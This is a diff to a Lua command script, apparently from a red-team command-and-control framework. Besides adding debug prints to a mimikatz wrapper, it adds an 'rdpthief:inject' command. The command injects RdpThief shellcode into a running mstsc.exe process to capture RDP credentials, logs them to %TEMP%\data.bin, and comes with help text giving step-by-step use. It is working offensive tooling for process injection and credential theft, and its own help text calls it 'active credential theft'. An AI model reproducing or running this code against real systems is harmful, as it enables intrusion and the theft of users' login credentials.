@@ -347,7 +347,6 @@ local function run_dir(cmd,args)
 
     local arch = session.Os.Arch
     local bof_file = bof_path("dir", arch)
-    print(packed_args)
     return bof(session, script_resource(bof_file), packed_args, true)
 end
 
@@ -771,6 +770,9 @@ local function run_mimikatz(args, cmd)
         table.insert(args, "exit")
     end
     local mimikatz_path = "common/mimikatz/mimikatz." .. arch .. ".exe"
+    print(#args)
+    print(args[1])
+    print(args[2])
     return execute_exe(session, script_resource(mimikatz_path), args, true, 600, arch, "", new_sac())
 end
 
@@ -984,3 +986,64 @@ local cmd_execute_cross_session = command("execute_cross_session", run_execute_c
 cmd_execute_cross_session:Flags():Int("session_id", 0, "the session ID of the user in which context the specified binary needs to be executed.")
 cmd_execute_cross_session:Flags():String("binary_path", "", "path to the binary that you like to execute")
 
+-- Manual inject into specific PID
+local function run_rdpthief_inject(args, cmd)
+    local pid = 0
+
+    if args and #args >= 1 then
+        pid = tonumber(args[1])
+    else
+        pid = cmd:Flags():GetInt("pid")
+    end
+
+    if pid == 0 or pid == nil then
+        error("PID is required")
+    end
+
+    local session = active()
+    local arch = session.Os.Arch
+
+    -- Only support x64 for now
+    if arch ~= "x64" then
+        error("RdpThief only supports x64 architecture")
+    end
+
+    local shellcode = read_resource("common/rdpthief/rdpthief.x64.shellcode")
+    local packed_args = bof_pack("ib", pid, shellcode)
+    local bof_file = "injection/ntcreatethread/ntcreatethread." .. session.Os.Arch .. ".o"
+    local result =  bof(session, script_resource(bof_file), packed_args, true)
+
+    if result then
+        print("[+] Successfully injected RdpThief into PID " .. pid)
+        print("[*] Credentials will be logged to %TEMP%\\data.bin")
+    else
+        error("Failed to inject DLL into PID " .. pid)
+    end
+
+    return result
+end
+
+local cmd_rdpthief_inject = command("rdpthief:inject", run_rdpthief_inject, "Manually inject RdpThief into mstsc.exe process <pid>", "T1056.001")
+cmd_rdpthief_inject:Flags():Int("pid", 0, "PID of mstsc.exe process to inject into")
+opsec("rdpthief:inject", 8.5)
+
+help("rdpthief:inject", [[
+Manually inject RdpThief DLL into a specific mstsc.exe process.
+
+Positional format:
+  rdpthief inject 1234
+
+Flag format:
+  rdpthief inject --pid 1234
+
+Steps to use:
+1. Find mstsc.exe process: ps | grep mstsc
+2. Inject into the PID: rdpthief inject <pid>
+3. Wait for user to enter credentials
+
+Note:
+- Only supports x64 architecture
+- Target must be mstsc.exe process
+- Credentials are logged to %TEMP%\data.bin
+- High OPSEC risk (8.5) - active credential theft
+]])
